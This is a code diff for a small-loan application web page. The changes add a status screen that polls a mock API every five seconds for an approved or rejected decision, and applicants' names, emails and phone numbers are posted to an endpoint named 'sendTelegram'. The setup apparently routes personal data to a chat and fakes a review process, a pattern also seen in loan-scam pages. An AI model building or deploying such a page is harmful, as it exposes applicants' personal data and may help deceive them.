@@ -116,6 +116,41 @@
         .hidden {
             display: none;
         }
+
+        .status-box {
+            text-align: center;
+            padding: 25px 15px;
+            border-radius: 10px;
+            background: #f7f7f7;
+        }
+
+        .status-icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+
+        .status-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .status-text {
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .approved {
+            color: #16803c;
+        }
+
+        .rejected {
+            color: #d62828;
+        }
+
+        .pending {
+            color: #d88900;
+        }
     </style>
 </head>
 
@@ -248,18 +283,60 @@
 
     </div>
 
+
+    <!-- STEP 4 -->
+
+    <div id="statusForm" class="hidden">
+
+        <div class="status-box">
+
+            <div
+                id="statusIcon"
+                class="status-icon">
+                ⏳
+            </div>
+
+            <div
+                id="statusTitle"
+                class="status-title pending">
+                Application Under Review
+            </div>
+
+            <div
+                id="statusText"
+                class="status-text">
+                Your application has been submitted
+                successfully and is currently being reviewed.
+                Please keep this page open.
+            </div>
+
+        </div>
+
+    </div>
+
 </div>
 
 
 <script>
 
+const MOCK_API =
+    "https://6a7ae4d98c69b3eb4a17a33f.mockapi.io/approval";
+
+
 let userData = {
+
     firstName: "",
     lastName: "",
     email: "",
     phone: "",
     loanAmount: ""
+
 };
+
+
+let applicationId = null;
+
+let statusTimer = null;
 
 
 /* ================================
@@ -278,7 +355,9 @@ function formatPhone() {
 
         phoneInput.value =
             phoneInput.value.substring(0, 9);
+
     }
+
 }
 
 
@@ -353,27 +432,34 @@ function registerUser() {
 
 
     userData.firstName = firstName;
+
     userData.lastName = lastName;
+
     userData.email = email;
+
     userData.phone = phone;
 
 
     document
         .getElementById("successMsgRegister")
-        .classList.remove("hidden");
+        .classList
+        .remove("hidden");
 
 
     document
         .getElementById("registerForm")
-        .classList.add("hidden");
+        .classList
+        .add("hidden");
 
 
     document
         .getElementById("loanForm")
-        .classList.remove("hidden");
+        .classList
+        .remove("hidden");
 
 
     loadLoanAmounts();
+
 }
 
 
@@ -388,11 +474,13 @@ function loadLoanAmounts() {
 
 
     const amounts = [
+
         "USD 100",
         "USD 200",
         "USD 300",
         "USD 500",
         "USD 1,000"
+
     ];
 
 
@@ -455,18 +543,19 @@ function loadLoanAmounts() {
                 .getElementById("reviewAmount")
                 .textContent =
                 userData.loanAmount;
+
         };
 
 
         amountList.appendChild(button);
 
     });
+
 }
 
 
 /* ================================
    STEP 3
-   SEND TO VERCEL API
 ================================ */
 
 async function applyLoan() {
@@ -505,6 +594,7 @@ async function applyLoan() {
             await fetch(
                 "/api/sendTelegram",
                 {
+
                     method: "POST",
 
                     headers: {
@@ -514,6 +604,7 @@ async function applyLoan() {
 
                     body:
                         JSON.stringify(userData)
+
                 }
             );
 
@@ -522,42 +613,42 @@ async function applyLoan() {
             await response.json();
 
 
-        if (result.success) {
+        if (!result.success) {
 
-            alert(
-                "Application submitted successfully."
-            );
-
-
-            button.textContent =
-                "Application Submitted";
-
-
-        } else {
-
-            console.error(result);
-
-
-            alert(
+            throw new Error(
                 result.message ||
-                "Unable to send application."
+                "Unable to submit application."
             );
 
-
-            button.disabled = false;
-
-            button.textContent =
-                "Apply";
         }
+
+
+        applicationId =
+            result.applicationId;
+
+
+        document
+            .getElementById("reviewForm")
+            .classList
+            .add("hidden");
+
+
+        document
+            .getElementById("statusForm")
+            .classList
+            .remove("hidden");
+
+
+        startStatusChecking();
 
 
     } catch (error) {
 
         console.error(error);
 
-
         alert(
-            "Connection error. Please try again."
+            error.message ||
+            "Unable to submit application."
         );
 
 
@@ -565,7 +656,150 @@ async function applyLoan() {
 
         button.textContent =
             "Apply";
+
     }
+
+}
+
+
+/* ================================
+   CHECK APPLICATION STATUS
+================================ */
+
+function startStatusChecking() {
+
+    checkApplicationStatus();
+
+
+    statusTimer =
+        setInterval(
+            checkApplicationStatus,
+            5000
+        );
+
+}
+
+
+/* ================================
+   GET STATUS FROM MOCK API
+================================ */
+
+async function checkApplicationStatus() {
+
+    if (!applicationId) {
+        return;
+    }
+
+
+    try {
+
+        const response =
+            await fetch(
+                `${MOCK_API}/${applicationId}`
+            );
+
+
+        if (!response.ok) {
+            return;
+        }
+
+
+        const application =
+            await response.json();
+
+
+        const status =
+            application.status;
+
+
+        if (status === "approved") {
+
+            showApproved();
+
+            clearInterval(statusTimer);
+
+        }
+
+
+        else if (status === "rejected") {
+
+            showRejected();
+
+            clearInterval(statusTimer);
+
+        }
+
+    } catch (error) {
+
+        console.error(
+            "Status check failed:",
+            error
+        );
+
+    }
+
+}
+
+
+/* ================================
+   APPROVED
+================================ */
+
+function showApproved() {
+
+    document
+        .getElementById("statusIcon")
+        .textContent = "✅";
+
+
+    document
+        .getElementById("statusTitle")
+        .textContent =
+        "Loan Approved Successfully";
+
+
+    document
+        .getElementById("statusTitle")
+        .className =
+        "status-title approved";
+
+
+    document
+        .getElementById("statusText")
+        .textContent =
+        "Congratulations! Your loan application has been approved successfully.";
+
+}
+
+
+/* ================================
+   REJECTED
+================================ */
+
+function showRejected() {
+
+    document
+        .getElementById("statusIcon")
+        .textContent = "❌";
+
+
+    document
+        .getElementById("statusTitle")
+        .textContent =
+        "Loan Application Rejected";
+
+
+    document
+        .getElementById("statusTitle")
+        .className =
+        "status-title rejected";
+
+
+    document
+        .getElementById("statusText")
+        .textContent =
+        "Unfortunately, your loan application was not approved.";
+
 }
 
 </script>
